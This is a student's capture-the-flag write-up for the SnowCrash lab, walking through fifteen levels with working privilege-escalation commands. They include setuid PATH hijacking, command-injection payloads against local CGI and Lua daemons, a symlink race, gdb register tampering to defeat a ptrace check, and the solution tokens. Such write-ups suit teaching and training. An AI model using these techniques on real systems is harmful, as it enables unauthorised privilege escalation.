# SnowCrash – write up
#cs/school21

## Level 00 (vulnerable file with a simple cipher)
We begin by searching for files owned by user `flag00`
```sh
> find / -user flag00 2>/dev/null
/usr/sbin/john
/rofs/usr/sbin/john
> cat /usr/sbin/john
cdiiddwpgswtgt
```

Once we found it, we can either try several common ciphers (of which the simplest one is Caesar cypher) or perform cryptographic analysis on the encrypted text.

Using an online [Index of Coincidence Calculator](https://www.dcode.fr/index-coincidence) yields a IoC of 0.07692, which strongly suggests either a transposition cipher or a mono alphabetic substitution. Of these the simplest one is Caesar cypher.

We make use of a simple Python script to quickly enumerate multiple shifts:

```py
def decrypt():
	ciphertext = raw_input('Please enter your encrypted sentence here:')
	shift = input('Please enter its max shift value: ')
	space = []
	z = ord('z')

	cipher_ords = [ord(x) for x in ciphertext]
	for j in range(shift):
		plaintext_ords = [
			o + j if o + j <= z else ord('a') + j - (z - o + 1) 
			for o in cipher_ords
		]
		plaintext_chars = [chr(i) for i in plaintext_ords]
		plaintext = ''.join(plaintext_chars)
		print j, ':Your encrypted sentence is:', plaintext

decrypt()
```

Among the output the only intelligible string is `nottoohardhere` at a shift of +11.

![](SnowCrash%20%E2%80%93%20write%20up/pasted%20image%200%202.png)

_Token: x24ti5gi3x0ol2eh4esiuxias_
- - - -

## Level 01 (weak hashes in /etc/passwd)
```sh
> cat /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

Contrary to Unix security guidelines, `/etc/passwd` includes a password hash in plain text, as opposed to storing it in `/etc/shadow`. Because the hash is 13 characters long, we suspect it to be a DES hash. Cracking it using [John the Ripper](https://www.openwall.com/john) we obtain the password.

```sh
> john --show <(echo 42hDRfypTqqnw)
abcdefg
```

_Token: f2av5il02puano7naaf6adaaf_
- - - -

## Level 02 
There is a `.pcap` file in our home directory. Examining the packet data contained within using  [Wireshark](https://www.wireshark.org/download.html), we stumble upon the following wireless exchange

![](SnowCrash%20%E2%80%93%20write%20up/Wireshark%202.png)

We need to account for typos made by whoever was entering the password. In ASCII `0x7f` corresponds to `DEL`, and the password is, therefore, `ft_waNDReL0L`.

_Token: kooda2puivaav1idi4f57q8iq_
- - - -

## Level 03 (setuid exploit)
```sh
> ls -l ~
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

We try to exploit the `setuid` flag set on `level03`

```sh
> strings level03
/usr/bin/env echo Exploit me
> ltrace level03
system("/usr/bin/env echo Exploit me"...)
```

The program makes a call `echo`, but doesn’t make sure that  `echo` is what the utility thinks it is, by delegating its search to `/usr/bin/env`. We can exploit this weakness by placing another script named `echo`  on the `$PATH`.

```sh
> chmod 755 .
> echo '#!/bin/bash' >> ./echo; echo 'getflag' >> ./echo
> chmod 755 ./echo
> export PATH="/home/user/level03:$PATH"
> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

_Token: qi0maab88jeaj46qoumi7maus_
- - - -

## Level 04 (CGI exploit)
We have a `perl` script, which again has a `setuid` bit set. However, modern Perl interpreters ignore access rights flags on the scripts that they execute. 

```sh
> ./level04.pl x='`getflag `'
Content-type: text/html

Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
```

We need to be try harder.  Noting that the author of the script left a comment referring to port 4747, we attempt a localhost connection.

```sh
> curl 'localhost:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

_Token: ne2searoevaevoem4ov4ar8ap_
- - - -

## Level 05 (cron exploit)
```sh
You have mail.
> cat /var/spool/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
> service cron status
cron start/running, process 1298
```

We’ve got mail from a friend, pointing out a `cron` rule running every half minute and authored by  `flag05`. The rule tells `cron` to run any executable it finds within the `/usr/sbin/openarenaserver` directory and delete it afterwards. 

Placing the following script inside `/opt/openarenaserver` and waiting for 30 seconds, we get the desired token. 

```sh
getflag > /tmp/getflag_output
```

> Some students taking this exercise did not receive a mail notification. For them, the best course of action was to search for files owned by `level05` using the `find` command.  

_Token: viuaaale9huek52boumoomioc_
- - - -

## Level 06 (preg_replace exploit)
The use of the function `preg_replace` with the `e` modifier has been forbidden in recent versions of PHP, because of its serious security implications. Luckily -for us-, our local PHP interpreter is still vulnerable. 

```sh
> chmod 755 .
> echo '[x {$y('getflag')}]' > shell_exec
> ./level06 shell_exec BLA
Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
```

_Token: wiok45aaoguiboiki2tuin6ub_
- - - -

## Level 07 (another setuid exploit)
We’ve got another compiled executable `level07` in our home directory. By examining its library calls, we infer that the program gets the name of a separate script that it then executes from an environmental variable `$LOGNAME`. 

```sh
> ltrace ./level07
getenv("LOGNAME")                                = "level07"
system("/bin/echo level07 "level07...
``` 

Because a program inherits the environment from the user who is executing it, regardless of `setuid` bits, we can modify its behaviour to our advantage.

```sh
> export LOGNAME='`getflag`'
> ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

_Token: fiumuikeil55xe9cu4dood66h_
- - - -

## Level 08 (another setuid exploit)
We’ve got a file `token` in our home directory (presumable containing the token for the current level), but, unfortunately, no permission to read it. The program `level08`, which conveniently has its `setuid` bit set, is a simple reader, reprinting contents of any text file to stdout. 

To make out lives harder, `level08` checks that the file, passed as a parameter,  isn’t named `token`. However, we can still fool `level08` by creating a soft-link to `token`.

```sh
> chmod 755 .
> ln -s token soft_link
> ./level08 soft_link
quif5eloekouj29ke0vouxean
```

_Token: 25749xKZ8L7DkSCwJkT9dyv6f_
- - - -

## Level 09 (a non-trivial cipher)
There is a `token` file, containing an encrypted token, produced by `level09`. We start by feeding multiple strings to `level09` in order to reverse engineer its cipher algorithm. 

```sh
> ./level09 aaaaaaa
abcdefg
> ./level09 token
tpmhr
```

It looks like each character is encoded using an incremental shift. If that is so, we can decode the encrypted token with the following program

```python
import sys
f = sys.stdin
tmp = f.read()
res = ''
i = 0
while i < (len(tmp) - 1):
	pos = ord(tmp[i])
	res = res + chr(pos - i)
	i += 1
print(res)
```

The decoded token is `f3iji1ju5yuevaus41q1afiuq`. Running `getflag` as `flag09` yields the answer.

_Token: s5cAJpM8ev6XHw998pRWG728z_
- - - -

## Level 10 (access syscall exploit)
```sh
> ll
rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
> strings level10
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
/usr/include/netinet
```

It looks like the program `level10`  acts as a server that responds with the contents of a file, passed as an argument. 
 
Let’s examine shared library calls made by `level10`.

```sh
> gdb ./level10
(gdb) layout asm
0x8048749 <main+117>    call   0x80485e0 <access@plt>
```

There is a known exploit, pertaining to the fact that the value returned by `access` may become outdated by the time a program acts on it. 

We use this exploit by creating race conditions with two simultaneous infinite loops running on our VM. 

```sh
# In a terminal window
> chmod 755 . && echo "HELLO" > test
> while true; do ln -s -f test link; ln -s -f token link; done
# In another terminal window
> while true; do ./level10 link 127.0.0.1; done
```

At the same time, we try to connect to `localhost` within our local machine

```sh
> while true; do nc -l 6969 ; done
.*( )*.
HELLO
.*( )*.
HELLO
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
^C
```

Running `getflag` as `flag10` yields the answer.

_Token: feulo4b72j7edeahuete3no7c_
- - - -

## Level 11 (CGI command injection)
Opening a `level11.lua` file, we see that a daemon is listening on local port 5151. Upon receiving a connection, it asks for a password and compares its hash against `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`. 

A quick Google search cracks the hash: `NotSoEasy`. However, this is not yet the password we need.

We note that the script uses string interpolation without escaping user input, which renders it vulnerable to a command injection attack.

```sh
> telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: ; getflag > /tmp/BLABLABLA.txt #
Erf nope..
Connection closed by foreign host.
> cat /tmp/BLABLABLA.txt
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

> Putting social engineering techniques to good use, we could recall that a human user is likely to be reusing passwords and try to log in using previously obtained tokens. For this particular level, this would work – the tokens for levels 10 and 11 are identical.   

_Token: feulo4b72j7edeahuete3no7c_
- - - -

## Level 12 (CGI command injection)
By examining the script, we notice that the url-parameter `x` is vulnerable to a command injection. However, this time an attempt is made to secure user input by preprocessing it. Any command passed as the parameter would be deleted. We need a work-around. 

Instead of passing commands directly, we could pass the a regex describing a script containing them. 

```sh
> echo "getflag > /tmp/passed.txt" > /tmp/000
> chmod 777 /tmp/000
> curl 'localhost:4646?x="`/*/000`"'
> cat /tmp/passed.txt
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

_Token: g1qKMiRpXf53AWhDaU7FEkczr_
- - - -

## Level 13 (overwriting registers)
```sh
> strings level13
UID %d started us but we we expect %d
your token is %s
level13_back.c
> ./level13 
UID 2013 started us but we we expect 4242
```

We need to spoof having a `uid` of 4242. The way to do it is by modifying register values as the program is running. Luckily for us, the virtual machine has `gdb` preinstalled. 

```sh
(gdb) disas main
0x08048595 <+9>:	call   0x8048380 <getuid@plt>
0x0804859a <+14>:	cmp    $0x1092,%eax
0x0804859f <+19>:	je     0x80485cb <main+63>
(gdb) break *0x0804859a
(gdb) run
(gdb) info registers
eax            0x7dd	2013 # 2013 is my current uid
(gdb) set $eax = 0x1092 # 0x1092 is 4242 in decimal
(gdb) cont
Continuing.
your token is 2A31L79asukciNyi8uppkEuSx
[Inferior 1 (process 3657) exited with code 050]
```

_Token: 2A31L79asukciNyi8uppkEuSx_
- - - -

## Level 14
There are no additional files in this level, so the only way to go about solving it is by examining `getflag`. 

```
> gdb getflag
(gdb) disas main
<+67>:	call   0x8048540 <ptrace@plt>
<+72>:	test   %eax,%eax
<+74>:	jns    0x80489a8 <main+98>
...
<+439>:	call   0x80484b0 <getuid@plt>
<+444>:	mov    %eax,0x18(%esp)
```

We can see that `getflag` makes two library calls:

* to `ptrace` — probably in an attempt to detect any tampering with the program using `gdb`
* to `getuid` — likely to get the `uid` of the executing user in order to determine which token to display

As `gdb` uses `ptrace` to attach to the processes it monitors, we can’t even reach the instruction at `<+439>`, being blocked by the guard at `<+72>`. Therefore, we first need to modify the register at `<+72>` to trick the guard into thinking that it’s not being monitored.

```
(gdb) b *(main + 72)
(gdb) b *(main + 444)
(gdb) run
...
Breakpoint 1, 0x0804898e in main ()
(gdb) info registers $eax
eax -1
(gdb) set $eax = 0 # preventing gdb detection
(gdb) n
...
Breakpoint 2, 0x08048b02 in main ()
(gdb) info registers $eax
eax 2014
```

We edit  the `uid`  from 2014 (`level14`) to 3014 (`flag14`), according to `/etc/passwd`

```sh
> cat /etc/passwd
level14:x:2014:2014::/home/user/level14:/bin/bash
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

Continuing the execution, 

```
(gdb) set $eax = 3014
(gdb) n
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```

Logging in as `flag14`  we get a concluding message from the creators of the project

```sh
> su flag14
Password:
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
> getflag
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```

> We could use this hack to solve all the preceding levels too, by setting `uid` to the value corresponding to the appropriate `flag`  

_Token: 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ_
- - - -

### A cheat

Since we’ve got our hands on the `.iso` file, we can simply mount and navigate its filesystem on our local machine. On macOS, one can do this using `unsquashfs`.

```sh
> sudo unsquashfs /Volumes/SnowCrash/casper/filesystem.squashfs
```

However, when hacking a real server, this would, of course, not be possible, and the tactics discussed above seem much more promising. 